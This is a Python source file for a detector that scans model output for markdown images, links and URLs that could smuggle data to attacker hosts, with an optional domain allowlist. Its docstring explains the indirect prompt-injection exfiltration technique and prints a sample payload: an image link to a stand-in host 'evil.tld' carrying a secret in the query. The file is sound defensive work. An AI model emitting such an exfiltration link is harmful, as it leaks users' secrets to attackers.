"""Data-exfiltration-channel detector.

A modern indirect-injection attack makes the model emit a markdown image or
link pointing at an attacker server, with stolen data in the URL::

    ![logo](https://evil.tld/log?d=<the secret the model just read>)

When a chat UI renders that image the browser silently fetches the URL and the
data leaves. This detector flags URLs in model output that look like an
exfiltration channel, and can enforce a domain allowlist.
"""
from __future__ import annotations

import re
from typing import List, Optional, Sequence
from urllib.parse import urlparse

from .base import Detector
from ..normalize import ScanContext
from ..types import Finding, Severity

# Markdown image: ![alt](url).  Markdown link: [text](url) (not preceded by !).
_MD_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*<?(https?://[^)\s>]+)>?\s*\)")
_MD_LINK = re.compile(r"(?<!!)\[[^\]]*\]\(\s*<?(https?://[^)\s>]+)>?\s*\)")
# A bare URL carrying a long encoded blob in its path or query.
_BARE_URL = re.compile(r"https?://[^\s)>\]]+")
_ENCODED_BLOB = re.compile(r"[A-Za-z0-9+/_-]{24,}={0,2}")


class DataExfiltrationDetector(Detector):
    name = "exfil_channel"

    def __init__(self, allowed_domains: Optional[Sequence[str]] = None):
        # When set, any URL whose host is not on the list is flagged, regardless
        # of how the data is carried. Hosts match themselves and any subdomain.
        self.allowed_domains = [d.lower().lstrip(".") for d in allowed_domains] \
            if allowed_domains else None

    def _host_allowed(self, url: str) -> bool:
        if self.allowed_domains is None:
            return True
        host = (urlparse(url).hostname or "").lower()
        return any(host == d or host.endswith("." + d) for d in self.allowed_domains)

    @staticmethod
    def _query_payload_len(url: str) -> int:
        parsed = urlparse(url)
        return len(parsed.query) + (len(parsed.fragment) if parsed.fragment else 0)

    def scan(self, ctx: ScanContext) -> List[Finding]:
        text = ctx.raw
        findings: List[Finding] = []
        claimed: List[tuple] = []

        def add(severity, message, span, evidence):
            if any(span[0] < e and s < span[1] for s, e in claimed):
                return
            claimed.append(span)
            findings.append(Finding(
                detector=self.name, category="data_exfiltration",
                severity=severity, message=message,
                evidence=evidence[:120], span=span,
            ))

        # Auto-loaded images are the most dangerous: no click required.
        for m in _MD_IMAGE.finditer(text):
            url = m.group(1)
            if not self._host_allowed(url):
                add(Severity.HIGH, "markdown image to a non-allowlisted host",
                    m.span(1), url)
            elif self._query_payload_len(url) >= 12:
                add(Severity.HIGH,
                    "markdown image URL carries data in its query/fragment",
                    m.span(1), url)

        # Links need a click, but a data-carrying one is still suspicious.
        for m in _MD_LINK.finditer(text):
            url = m.group(1)
            if not self._host_allowed(url):
                add(Severity.MEDIUM, "markdown link to a non-allowlisted host",
                    m.span(1), url)
            elif self._query_payload_len(url) >= 24:
                add(Severity.MEDIUM,
                    "markdown link URL carries a large data payload", m.span(1), url)

        # Bare URLs hiding an encoded blob (base64/hex) in path or query.
        for m in _BARE_URL.finditer(text):
            url = m.group(0)
            parsed = urlparse(url)
            if self.allowed_domains is not None and not self._host_allowed(url):
                add(Severity.MEDIUM, "URL to a non-allowlisted host", m.span(), url)
            elif _ENCODED_BLOB.search(parsed.path + "?" + parsed.query):
                add(Severity.LOW, "URL contains an encoded blob", m.span(), url)

        return findings
